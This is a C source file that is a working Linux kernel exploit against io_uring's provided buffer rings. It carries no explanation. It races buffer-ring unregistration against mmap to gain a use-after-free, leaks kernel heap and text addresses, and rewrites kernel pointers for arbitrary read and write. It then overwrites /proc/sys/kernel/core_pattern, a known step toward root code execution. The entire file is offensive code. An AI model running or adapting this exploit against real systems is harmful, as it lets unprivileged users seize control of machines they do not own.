#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/file.h>
#include <linux/io_uring.h>
#define IORING_SETUP_REGISTERED_FD_ONLY    (1U << 15)
#define IORING_REGISTER_USE_REGISTERED_RING    (1U << 31)
#define IORING_SETUP_NO_MMAP (1U << 14)

static void perror_exit(const char *msg)
{
    perror(msg); exit(1);
}

static int io_uring_setup(unsigned int entries, struct io_uring_params *p)
{
    return syscall(SYS_io_uring_setup, entries, p);
}

static int io_uring_register(int fd, int opcode, void *arg, unsigned int nr_args)
{
    return syscall(SYS_io_uring_register, fd, opcode, arg, nr_args);
}

static int io_uring_enter(unsigned int fd, unsigned int to_submit,
                          unsigned int min_complete, unsigned int flags,
                          sigset_t *sig)
{
    return syscall(SYS_io_uring_enter, fd, to_submit, min_complete, flags, sig);
}

void pin_on_cpu(int cpu_id)
{
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu_id, &cpuset);
    sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);
}

struct io_uring {
    unsigned int head;
    unsigned int tail;
};

struct io_rings {
    struct io_uring sq, cq;
    unsigned int sq_ring_mask, cq_ring_mask;
    unsigned int sq_ring_entries, cq_ring_entries;
    unsigned int sq_dropped;
    int sq_flags;
    unsigned int cq_flags;
    unsigned int cq_overflow;
};

struct io_uring_buf_reg_ {
    __u64    ring_addr;
    __u32    ring_entries;
    __u16    bgid;
    __u16    flags;
    __u64    resv[3];
};

#define IOU_PBUF_RING_MMAP 1
#define IORING_OFF_PBUF_RING 0x80000000ULL
#define IORING_OFF_PBUF_SHIFT 16
#define IORING_SETUP_NO_SQARRAY (1U << 16)
char tmp[256];

int fd;
int sfd[2];


struct io_buffer_list {
    union {
        struct {
            unsigned long next;
            unsigned long prev;
        } buf_list;
        struct {
            void **buf_pages;
            void *buf_ring;
        };
    };
    unsigned short bgid;
    unsigned short buf_nr_pages;
    unsigned short nr_entries;
    unsigned short head;
    unsigned short mask;
    unsigned char is_mapped;
    unsigned char is_mmap;
    unsigned char is_ready;
};

void *race(void *arg)
{
    unsigned long kheap = 0, ktext = 0;
    void *kdata;

    pin_on_cpu(1);
    
    write(sfd[1], tmp, 1);
    read(sfd[1], tmp, 1);

    void *pbuf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, IORING_OFF_PBUF_RING + (0 << IORING_OFF_PBUF_SHIFT));
    if (pbuf == MAP_FAILED) {
        perror("[-] mmap");
        return NULL;
    }

    int i = 0;
    for (; i < 0x1000; i += 0x8) {
        if (*(unsigned long *)(pbuf + i) == 0x101010000UL)
            break;
    }

    unsigned long orig_buf_ring;
    unsigned long start = 0x00000000;
    unsigned long end;
    struct io_buffer_list *bl = (pbuf + i - 0x38);
    
    orig_buf_ring = kheap = ((unsigned long)bl[1].buf_ring);
    printf("[*] original kheap leak:\t0x%016lx\n", kheap);
    
    end = kheap & 0xfffffffUL;
    kheap &= ~0xfffffffUL;
    printf("[*] fixed kheap:\t0x%016lx\n", kheap);

    #define PAGE_SIZE (0x1000UL)
    for (unsigned long i = start; i < end; i += PAGE_SIZE) {
        bl[1].buf_ring = (void *)(kheap + i);

        kdata = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, IORING_OFF_PBUF_RING + (1 << IORING_OFF_PBUF_SHIFT));
        if (kdata == MAP_FAILED) {
            perror("[-] exploit failed");
            return NULL;
        }

        for (unsigned long j = 0; j < PAGE_SIZE; j += 8) {
            unsigned long tmp_ktext = *(unsigned long *)(kdata + j);
            if ((tmp_ktext & 0xffffffff00000000UL) == 0xffffffff00000000UL) {
                ktext = tmp_ktext;
                break;
            }
        }

        munmap(kdata, PAGE_SIZE);
        if (ktext != 0)
            break;
    }

    printf("[*] original ktext leak:\t0x%016lx\n", ktext);

    ktext &= ~0xffffffUL;
    #define KTEXT_OFFSET (0x1000000UL)
    #define CORE_PATTERN_OFFSET (0x27b4420UL)
    #define PFX_VERIFY_CPU_OFFSET_IN_PAGE (0x270UL)

    for (unsigned long i = 0; i < 3; i++) {
        bl[1].buf_ring = (void *)(ktext - KTEXT_OFFSET * i);
        kdata = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, IORING_OFF_PBUF_RING + (1 << IORING_OFF_PBUF_SHIFT));
        if (kdata == MAP_FAILED) {
            perror("[-] exploit failed");
            return NULL;
        }

        unsigned long tmp_data = *(unsigned long *)(kdata + PFX_VERIFY_CPU_OFFSET_IN_PAGE);
        printf("%ld: %016lx\n", i, tmp_data);
        munmap(kdata, PAGE_SIZE);
        if (tmp_data == 0x9090909090909090UL) {
            ktext -= KTEXT_OFFSET * i;
            break;
        }
    }

    printf("[*] fixed ktext:\t0x%016lx\n", ktext);

    unsigned long core_pattern_addr = ktext + CORE_PATTERN_OFFSET;
    bl[1].buf_ring = (void *)(core_pattern_addr & ~0xfffUL);

    kdata = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, IORING_OFF_PBUF_RING + (1 << IORING_OFF_PBUF_SHIFT));
    if (kdata == MAP_FAILED) {
        perror("[-] exploit failed");
        return NULL;
    }

    strcpy(kdata + (CORE_PATTERN_OFFSET & 0xfffUL), "test");
    munmap(kdata, PAGE_SIZE);
    bl[1].buf_ring = (void *)orig_buf_ring;

    char core_pattern_data[100] = {};
    int check_fd = open("/proc/sys/kernel/core_pattern", O_RDONLY);
    read(check_fd, core_pattern_data, sizeof(core_pattern_data));
    close(check_fd);
    
    printf("%s\n", core_pattern_data); // should be "test"
}

int main()
{
    int ret;
    void *pbuf;
    void *cq, *sq, *dummy, *ivp;
    struct io_uring_params p = {};
    struct io_uring_sqe *sqe;
    struct io_rings *r;

    socketpair(AF_UNIX, SOCK_STREAM, 0, sfd);

    dummy = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (dummy == MAP_FAILED) perror_exit("[-] mmap");

    cq = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (cq == MAP_FAILED) perror_exit("[-] mmap");

    sqe = sq = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (sq == MAP_FAILED) perror_exit("[-] mmap");

    p.flags |= IORING_SETUP_NO_MMAP;
    p.flags |= IORING_SETUP_NO_SQARRAY;
    p.cq_off.resv2 = (unsigned long)cq;
    p.sq_off.resv2 = (unsigned long)sq;

    fd = io_uring_setup(32, &p);
    if (fd < 0) perror_exit("[-] io_uring_setup");

    struct io_uring_buf_reg reg = {};
    reg.pad |= IOU_PBUF_RING_MMAP;
    reg.ring_entries = 1;
    
    for (int i = 0; i < 64; i++) {
        reg.bgid = i;
        ret = io_uring_register(fd, IORING_REGISTER_PBUF_RING, &reg, 1);
        if (ret < 0) perror_exit("[-] io_uring_register");
    }

    pin_on_cpu(0);
    memset(&reg, 0, sizeof(reg));
    reg.bgid = 0;
    
    pthread_t tid;
    pthread_create(&tid, NULL, race, NULL);
    read(sfd[0], tmp, 1);
    write(sfd[0], tmp, 1);
    
    ret = io_uring_register(fd, IORING_UNREGISTER_PBUF_RING, &reg, 1);
    pthread_join(tid, NULL);

    return 0;
}
